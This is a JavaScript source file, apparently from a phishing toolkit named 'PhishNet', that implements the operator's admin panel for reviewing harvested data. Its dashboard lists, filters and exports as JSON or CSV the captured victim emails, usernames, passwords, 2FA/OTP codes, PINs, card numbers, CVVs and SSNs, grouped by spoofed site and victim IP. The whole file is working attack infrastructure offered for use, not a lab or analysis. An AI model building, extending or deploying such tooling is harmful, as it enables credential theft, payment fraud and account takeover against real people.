// Developer: Sreeraj
// GitHub: https://github.com/s-r-e-e-r-a-j

import crypto from 'crypto';
import fs from 'fs-extra';
import path from 'path';
import bodyParser from 'body-parser';
import { CONFIG } from '../config/index.js';

export class AdminPanel {
    constructor(app, dataDir, adminPath) {
        this.app = app;
        this.dataDir = dataDir;
        this.sessions = new Map();
        this.failed = new Map();
        this.pass = CONFIG.adminPass;
        this.path = adminPath;
        
        this.setup();
    }

    setup() {
        this.app.get(this.path, (req, res) => {
            res.send(this.loginPage());
        });

        this.app.get(this.path + '/dashboard', (req, res) => {
            const sid = req.query.sid || req.headers['x-session-id'];
            
            if (!sid || !this.sessions.has(sid)) {
                return res.redirect(this.path);
            }
            
            const session = this.sessions.get(sid);
            if (session.expires < Date.now()) {
                this.sessions.delete(sid);
                return res.redirect(this.path);
            }
            
            session.expires = Date.now() + 3600000;
            this.sessions.set(sid, session);
            
            res.send(this.dashboardPage(sid));
        });

        this.app.post(this.path + '/auth', bodyParser.json(), (req, res) => {
            const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
            const { username, password } = req.body;
            
            const attempts = this.failed.get(ip) || 0;
            if (attempts >= 5) {
                return res.status(429).json({ error: 'Too many attempts' });
            }
            
            if (username === CONFIG.adminUser && password === this.pass) {
                const sid = crypto.randomBytes(16).toString('hex');
                this.sessions.set(sid, {
                    ip,
                    expires: Date.now() + 3600000
                });
                this.failed.delete(ip);
                return res.json({ success: true, sessionId: sid });
            } else {
                this.failed.set(ip, attempts + 1);
                return res.status(401).json({ error: 'Invalid credentials' });
            }
        });

        this.app.get(this.path + '/data', (req, res) => {
            const sid = req.query.sid || req.headers['x-session-id'];
            
            if (!sid || !this.sessions.has(sid)) {
                return res.status(401).json({ error: 'Not authenticated' });
            }
            
            const session = this.sessions.get(sid);
            if (session.expires < Date.now()) {
                this.sessions.delete(sid);
                return res.status(401).json({ error: 'Session expired' });
            }
            
            session.expires = Date.now() + 3600000;
            this.sessions.set(sid, session);
            
            const logs = this.getLogs();
            
            const stats = {
                total: logs.length,
                uniqueIPs: new Set(logs.map(l => l.ip)).size,
                lastHour: logs.filter(l => l.timestamp > Date.now() - 3600000).length,
                byType: {},
                bySite: {}
            };
            
            logs.forEach(log => {
                stats.byType[log.type] = (stats.byType[log.type] || 0) + 1;
                stats.bySite[log.site] = (stats.bySite[log.site] || 0) + 1;
            });
            
            res.json({ 
                logs: logs.slice(-100).reverse(),
                stats,
                time: Date.now()
            });
        });

        this.app.post(this.path + '/clear', (req, res) => {
            const sid = req.query.sid || req.headers['x-session-id'];
            
            if (!sid || !this.sessions.has(sid)) {
                return res.status(401).json({ error: 'Not authenticated' });
            }
            
            fs.writeFileSync(path.join(this.dataDir, 'captures.dat'), '');
            res.json({ success: true });
        });

        this.app.post(this.path + '/logout', (req, res) => {
            const sid = req.query.sid || req.headers['x-session-id'];
            if (sid) this.sessions.delete(sid);
            res.json({ success: true });
        });
    }

    loginPage() {
        return `
            <!DOCTYPE html>
            <html>
            <head>
                <title>PhishNet Admin</title>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <style>
                    body {
                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        display: flex;
                        height: 100vh;
                        margin: 0;
                    }
                    .login-box {
                        max-width: 360px;
                        margin: auto;
                        background: white;
                        padding: 40px;
                        border-radius: 8px;
                        box-shadow: 0 10px 25px rgba(0,0,0,0.1);
                        width: 90%;
                    }
                    h2 {
                        text-align: center;
                        color: #333;
                        margin-bottom: 30px;
                        font-weight: 600;
                    }
                    input {
                        width: 100%;
                        padding: 12px;
                        margin: 8px 0;
                        border: 2px solid #e0e0e0;
                        border-radius: 6px;
                        font-size: 16px;
                        box-sizing: border-box;
                        transition: border-color 0.3s;
                    }
                    input:focus {
                        outline: none;
                        border-color: #667eea;
                    }
                    button {
                        width: 100%;
                        padding: 12px;
                        background: #667eea;
                        color: white;
                        border: none;
                        border-radius: 6px;
                        font-size: 16px;
                        font-weight: 600;
                        cursor: pointer;
                        margin-top: 16px;
                        transition: background 0.3s;
                    }
                    button:hover {
                        background: #5a67d8;
                    }
                    .error {
                        color: #e53e3e;
                        text-align: center;
                        margin-top: 16px;
                        font-size: 14px;
                        min-height: 20px;
                    }
                </style>
            </head>
            <body>
                <div class="login-box">
                    <h2>PhishNet Admin</h2>
                    <input type="text" id="username" placeholder="Username">
                    <input type="password" id="password" placeholder="Password">
                    <button onclick="login()">Login</button>
                    <div class="error" id="error"></div>
                </div>
                <script>
                    const basePath = window.location.pathname;
                    
                    async function login() {
                        const username = document.getElementById('username').value;
                        const password = document.getElementById('password').value;
                        const errorDiv = document.getElementById('error');
                        
                        try {
                            const response = await fetch(basePath + '/auth', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ username, password })
                            });
                            
                            const data = await response.json();
                            
                            if (data.success) {
                                window.location.href = basePath + '/dashboard?sid=' + data.sessionId;
                            } else {
                                errorDiv.textContent = data.error || 'Login failed';
                            }
                        } catch (err) {
                            errorDiv.textContent = 'Connection error';
                        }
                    }
                    
                    document.getElementById('password').addEventListener('keypress', (e) => {
                        if (e.key === 'Enter') login();
                    });
                </script>
            </body>
            </html>
        `;
    }

    dashboardPage(sid) {
        return `
            <!DOCTYPE html>
            <html>
            <head>
                <title>PhishNet Dashboard</title>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <style>
                    * { margin: 0; padding: 0; box-sizing: border-box; }
                    body {
                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                        background: #f0f2f5;
                        padding: 20px;
                    }
                    .container {
                        max-width: 1400px;
                        margin: 0 auto;
                    }
                    .header {
                        background: white;
                        padding: 20px;
                        border-radius: 8px;
                        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
                        margin-bottom: 20px;
                        display: flex;
                        justify-content: space-between;
                        align-items: center;
                        flex-wrap: wrap;
                        gap: 15px;
                    }
                    .header h1 {
                        color: #1a1a1a;
                        font-size: 24px;
                    }
                    .header h1 span {
                        color: #667eea;
                    }
                    .stats {
                        display: grid;
                        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                        gap: 20px;
                        margin-bottom: 20px;
                    }
                    .stat-card {
                        background: white;
                        padding: 20px;
                        border-radius: 8px;
                        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
                        text-align: center;
                    }
                    .stat-value {
                        font-size: 32px;
                        font-weight: bold;
                        color: #667eea;
                        margin-bottom: 5px;
                    }
                    .stat-label {
                        color: #666;
                        font-size: 14px;
                        text-transform: uppercase;
                        letter-spacing: 0.5px;
                    }
                    .type-badge {
                        display: inline-block;
                        padding: 4px 8px;
                        border-radius: 4px;
                        font-size: 11px;
                        font-weight: 600;
                        margin-right: 8px;
                    }
                    .type-email_password { background: #e3f2fd; color: #1976d2; }
                    .type-username_password { background: #e8f5e9; color: #388e3c; }
                    .type-phone_password { background: #fff3e0; color: #f57c00; }
                    .type-2fa_code { background: #fce4ec; color: #c2185b; }
                    .type-payment_info { background: #ffebee; color: #d32f2f; }
                    .type-personal_info { background: #ede7f6; color: #7b1fa2; }
                    .actions {
                        display: flex;
                        gap: 10px;
                        flex-wrap: wrap;
                    }
                    button {
                        padding: 10px 20px;
                        background: #667eea;
                        color: white;
                        border: none;
                        border-radius: 6px;
                        font-size: 14px;
                        cursor: pointer;
                        transition: background 0.2s;
                    }
                    button:hover {
                        background: #5a67d8;
                    }
                    button.danger {
                        background: #e53e3e;
                    }
                    button.danger:hover {
                        background: #c53030;
                    }
                    .filters {
                        background: white;
                        padding: 20px;
                        border-radius: 8px;
                        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
                        margin-bottom: 20px;
                        display: flex;
                        gap: 15px;
                        flex-wrap: wrap;
                    }
                    .filters input, .filters select {
                        padding: 12px;
                        border: 2px solid #e0e0e0;
                        border-radius: 6px;
                        flex: 1;
                        min-width: 200px;
                        font-size: 14px;
                        transition: border-color 0.2s;
                    }
                    .filters input:focus, .filters select:focus {
                        outline: none;
                        border-color: #667eea;
                    }
                    .logs-table {
                        background: white;
                        border-radius: 8px;
                        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
                        overflow: auto;
                        max-height: 600px;
                    }
                    table {
                        width: 100%;
                        border-collapse: collapse;
                    }
                    th {
                        background: #f8f9fa;
                        padding: 15px;
                        text-align: left;
                        font-weight: 600;
                        color: #333;
                        font-size: 14px;
                        position: sticky;
                        top: 0;
                        z-index: 10;
                    }
                    td {
                        padding: 15px;
                        border-bottom: 1px solid #e0e0e0;
                        font-size: 14px;
                        vertical-align: top;
                    }
                    tr:hover td {
                        background: #f8f9fa;
                    }
                    .data-cell {
                        max-width: 500px;
                        overflow-x: auto;
                    }
                    .field-row {
                        margin: 4px 0;
                        display: flex;
                        align-items: center;
                        gap: 8px;
                    }
                    .field-label {
                        font-weight: 600;
                        color: #666;
                        min-width: 80px;
                        font-size: 12px;
                    }
                    .field-value {
                        color: #333;
                        font-family: 'Monaco', 'Menlo', monospace;
                        font-size: 12px;
                        word-break: break-word;
                    }
                    .field-value.password {
                        color: #e53e3e;
                    }
                    .field-value.email {
                        color: #1976d2;
                    }
                    .field-value.phone {
                        color: #388e3c;
                    }
                    .custom-section {
                        margin-top: 10px;
                        padding-top: 8px;
                        border-top: 1px dashed #ccc;
                    }
                    .custom-title {
                        font-size: 11px;
                        font-weight: 600;
                        color: #9b59b6;
                        text-transform: uppercase;
                        margin-bottom: 5px;
                    }
                    .custom-field {
                        margin: 3px 0;
                        display: flex;
                        align-items: center;
                        gap: 8px;
                    }
                    .custom-label {
                        font-weight: 600;
                        color: #9b59b6;
                        min-width: 80px;
                        font-size: 11px;
                    }
                    .custom-value {
                        color: #8e44ad;
                        font-family: 'Monaco', 'Menlo', monospace;
                        font-size: 11px;
                        word-break: break-word;
                    }
                    .loading {
                        text-align: center;
                        padding: 40px;
                        color: #666;
                        font-style: italic;
                    }
                    .status-bar {
                        background: white;
                        padding: 15px 20px;
                        border-radius: 8px;
                        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
                        margin-bottom: 20px;
                        display: flex;
                        justify-content: space-between;
                        align-items: center;
                        flex-wrap: wrap;
                        gap: 10px;
                        color: #666;
                        font-size: 14px;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h1>PhishNet <span>v${CONFIG.version}</span></h1>
                        <div class="actions">
                            <button onclick="exportLogs()">Export JSON</button>
                            <button onclick="exportCSV()">Export CSV</button>
                            <button class="danger" onclick="clearLogs()">Clear All</button>
                            <button onclick="logout()">Logout</button>
                        </div>
                    </div>
                    <div class="status-bar">
                        <div>Session: <span>${sid.substring(0, 8)}...</span></div>
                        <div>Last Update: <span id="lastUpdate">Just now</span></div>
                    </div>
                    <div class="stats" id="stats">
                        <div class="stat-card">
                            <div class="stat-value" id="totalLogs">0</div>
                            <div class="stat-label">Total Captures</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-value" id="uniqueIPs">0</div>
                            <div class="stat-label">Unique IPs</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-value" id="lastHour">0</div>
                            <div class="stat-label">Last Hour</div>
                        </div>
                    </div>
                    <div class="filters">
                        <input type="text" id="search" placeholder="Search in data..." oninput="filterData()">
                        <input type="text" id="ipFilter" placeholder="Filter by IP..." oninput="filterData()">
                        <select id="siteFilter" onchange="filterData()">
                            <option value="">All Sites</option>
                        </select>
                        <select id="typeFilter" onchange="filterData()">
                            <option value="">All Types</option>
                            <option value="email_password">Email + Password</option>
                            <option value="username_password">Username + Password</option>
                            <option value="phone_password">Phone + Password</option>
                            <option value="2fa_code">2FA/OTP Codes</option>
                            <option value="payment_info">Payment Info</option>
                            <option value="personal_info">Personal Info</option>
                        </select>
                    </div>
                    <div class="logs-table">
                        <table>
                            <thead>
                                <tr>
                                    <th>Time</th>
                                    <th>Site</th>
                                    <th>IP</th>
                                    <th>Type</th>
                                    <th>Data</th>
                                </tr>
                            </thead>
                            <tbody id="logsBody">
                                <tr><td colspan="5" class="loading">Loading captured data...</td></tr>
                            </tbody>
                        </table>
                    </div>
                </div>
                <script>
                    const SID = '${sid}';
                    const BASE_PATH = window.location.pathname.replace('/dashboard', '');
                    
                    let currentData = [];
                    let loadInterval;
                    let sites = new Set();
                    
                    async function loadData() {
                        try {
                            const response = await fetch(BASE_PATH + '/data?sid=' + SID, {
                                headers: { 'X-Session-Id': SID }
                            });
                            
                            if (response.status === 401) {
                                window.location.href = BASE_PATH;
                                return;
                            }
                            
                            const data = await response.json();
                            currentData = data.logs || [];
                            
                            updateStats(data.stats || { total: 0, uniqueIPs: 0, lastHour: 0 });
                            updateSiteFilter(currentData);
                            renderTable(currentData);
                            
                            document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
                        } catch (err) {
                            console.error('Failed to load data:', err);
                        }
                    }
                    
                    function updateStats(stats) {
                        document.getElementById('totalLogs').textContent = stats.total || 0;
                        document.getElementById('uniqueIPs').textContent = stats.uniqueIPs || 0;
                        document.getElementById('lastHour').textContent = stats.lastHour || 0;
                    }
                    
                    function updateSiteFilter(data) {
                        data.forEach(item => {
                            if (item.site) sites.add(item.site);
                        });
                        
                        const select = document.getElementById('siteFilter');
                        const currentValue = select.value;
                        
                        select.innerHTML = '<option value="">All Sites</option>';
                        Array.from(sites).sort().forEach(site => {
                            const option = document.createElement('option');
                            option.value = site;
                            option.textContent = site.charAt(0).toUpperCase() + site.slice(1);
                            select.appendChild(option);
                        });
                        
                        select.value = currentValue;
                    }
                    
                    function formatData(item) {
                        const data = item.data;
                        const fields = data.fields || {};
                        const raw = data.raw || {};
                        
                        let html = '<div class="type-badge type-' + item.type + '">' + item.type.replace('_', ' ').toUpperCase() + '</div>';
                        
                        if (fields.email) {
                            html += \`<div class="field-row"><span class="field-label">Email:</span><span class="field-value email">\${fields.email}</span></div>\`;
                        }
                        if (fields.username) {
                            html += \`<div class="field-row"><span class="field-label">Username:</span><span class="field-value">\${fields.username}</span></div>\`;
                        }
                        if (fields.phone) {
                            html += \`<div class="field-row"><span class="field-label">Phone:</span><span class="field-value phone">\${fields.phone}</span></div>\`;
                        }
                        if (fields.password) {
                            html += \`<div class="field-row"><span class="field-label">Password:</span><span class="field-value password">\${fields.password}</span></div>\`;
                        }
                        if (fields.otp) {
                            html += \`<div class="field-row"><span class="field-label">2FA:</span><span class="field-value">\${fields.otp}</span></div>\`;
                        }
                        if (fields.pin) {
                            html += \`<div class="field-row"><span class="field-label">PIN:</span><span class="field-value">\${fields.pin}</span></div>\`;
                        }
                        if (fields.card) {
                            html += \`<div class="field-row"><span class="field-label">Card:</span><span class="field-value">\${fields.card}</span></div>\`;
                        }
                        if (fields.cvv) {
                            html += \`<div class="field-row"><span class="field-label">CVV:</span><span class="field-value">\${fields.cvv}</span></div>\`;
                        }
                        if (fields.ssn) {
                            html += \`<div class="field-row"><span class="field-label">SSN:</span><span class="field-value">\${fields.ssn}</span></div>\`;
                        }
                        
                        const customFields = Object.keys(raw).filter(key => !fields[key] && key !== 'userAgent');
                        
                        if (customFields.length > 0) {
                            html += '<div class="custom-section"><div class="custom-title">Custom Fields:</div>';
                            customFields.forEach(key => {
                                const value = typeof raw[key] === 'object' ? JSON.stringify(raw[key]) : raw[key];
                                html += \`<div class="custom-field"><span class="custom-label">\${key}:</span><span class="custom-value">\${value}</span></div>\`;
                            });
                            html += '</div>';
                        }
                        
                        return html || '<span class="field-value">No data</span>';
                    }
                    
                    function renderTable(data) {
                        const tbody = document.getElementById('logsBody');
                        
                        if (!data || data.length === 0) {
                            tbody.innerHTML = '<tr><td colspan="5" class="loading">No data captured yet</td></tr>';
                            return;
                        }
                        
                        tbody.innerHTML = data.map(item => {
                            const time = new Date(item.timestamp).toLocaleString();
                            const site = item.site ? item.site.charAt(0).toUpperCase() + item.site.slice(1) : 'Unknown';
                            const type = item.type || 'unknown';
                            
                            return \`
                                <tr>
                                    <td style="white-space: nowrap;">\${time}</td>
                                    <td>\${site}</td>
                                    <td style="font-family: monospace;">\${item.ip}</td>
                                    <td><span class="type-badge type-\${type}">\${type.replace('_', ' ')}</span></td>
                                    <td class="data-cell">\${formatData(item)}</td>
                                </tr>
                            \`;
                        }).join('');
                    }
                    
                    function filterData() {
                        const search = document.getElementById('search').value.toLowerCase();
                        const ipFilter = document.getElementById('ipFilter').value.toLowerCase();
                        const siteFilter = document.getElementById('siteFilter').value;
                        const typeFilter = document.getElementById('typeFilter').value;
                        
                        if (!currentData || currentData.length === 0) return;
                        
                        const filtered = currentData.filter(item => {
                            let matches = true;
                            
                            if (search) {
                                matches = JSON.stringify(item.data).toLowerCase().includes(search);
                            }
                            
                            if (matches && ipFilter) {
                                matches = item.ip.toLowerCase().includes(ipFilter);
                            }
                            
                            if (matches && siteFilter) {
                                matches = item.site === siteFilter;
                            }
                            
                            if (matches && typeFilter) {
                                matches = item.type === typeFilter;
                            }
                            
                            return matches;
                        });
                        
                        renderTable(filtered);
                    }
                    
                    function exportLogs() {
                        const filtered = filterCurrentData();
                        const dataStr = JSON.stringify(filtered, null, 2);
                        const blob = new Blob([dataStr], { type: 'application/json' });
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = 'phishnet_captures_' + Date.now() + '.json';
                        a.click();
                        URL.revokeObjectURL(url);
                    }
                    
                    function exportCSV() {
                        const filtered = filterCurrentData();
                        
                        const allFields = new Set();
                        filtered.forEach(item => {
                            if (item.data && item.data.raw) {
                                Object.keys(item.data.raw).forEach(key => allFields.add(key));
                            }
                        });
                        
                        const headers = ['Timestamp', 'Site', 'IP', 'Type', ...Array.from(allFields)];
                        
                        const rows = filtered.map(item => {
                            const raw = item.data?.raw || {};
                            const row = [
                                new Date(item.timestamp).toISOString(),
                                item.site || '',
                                item.ip || '',
                                item.type || ''
                            ];
                            
                            Array.from(allFields).forEach(field => {
                                row.push(raw[field] || '');
                            });
                            
                            return row;
                        });
                        
                        const csv = [headers, ...rows].map(row => row.map(cell => \`"\${cell}"\`).join(',')).join('\\n');
                        const blob = new Blob([csv], { type: 'text/csv' });
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = 'phishnet_captures_' + Date.now() + '.csv';
                        a.click();
                        URL.revokeObjectURL(url);
                    }
                    
                    function filterCurrentData() {
                        const search = document.getElementById('search').value.toLowerCase();
                        const ipFilter = document.getElementById('ipFilter').value.toLowerCase();
                        const siteFilter = document.getElementById('siteFilter').value;
                        const typeFilter = document.getElementById('typeFilter').value;
                        
                        return currentData.filter(item => {
                            let matches = true;
                            
                            if (search) {
                                matches = JSON.stringify(item.data).toLowerCase().includes(search);
                            }
                            
                            if (matches && ipFilter) {
                                matches = item.ip.toLowerCase().includes(ipFilter);
                            }
                            
                            if (matches && siteFilter) {
                                matches = item.site === siteFilter;
                            }
                            
                            if (matches && typeFilter) {
                                matches = item.type === typeFilter;
                            }
                            
                            return matches;
                        });
                    }
                    
                    async function clearLogs() {
                        if (!confirm('Are you sure you want to clear all captured data?')) return;
                        
                        try {
                            const response = await fetch(BASE_PATH + '/clear?sid=' + SID, {
                                method: 'POST',
                                headers: { 'X-Session-Id': SID }
                            });
                            
                            if (response.ok) {
                                sites.clear();
                                await loadData();
                            }
                        } catch (err) {
                            alert('Failed to clear logs');
                        }
                    }
                    
                    async function logout() {
                        await fetch(BASE_PATH + '/logout?sid=' + SID, {
                            method: 'POST',
                            headers: { 'X-Session-Id': SID }
                        });
                        window.location.href = BASE_PATH;
                    }
                    
                    loadData();
                    loadInterval = setInterval(loadData, 3000);
                    
                    window.addEventListener('beforeunload', () => {
                        if (loadInterval) clearInterval(loadInterval);
                    });
                </script>
            </body>
            </html>
        `;
    }

    getLogs() {
        const file = path.join(this.dataDir, 'captures.dat');
        if (!fs.existsSync(file)) return [];
        
        return fs.readFileSync(file, 'utf8')
            .split('\n')
            .filter(l => l.trim())
            .map(l => {
                try {
                    return JSON.parse(l);
                } catch {
                    return null;
                }
            })
            .filter(l => l !== null);
    }
}
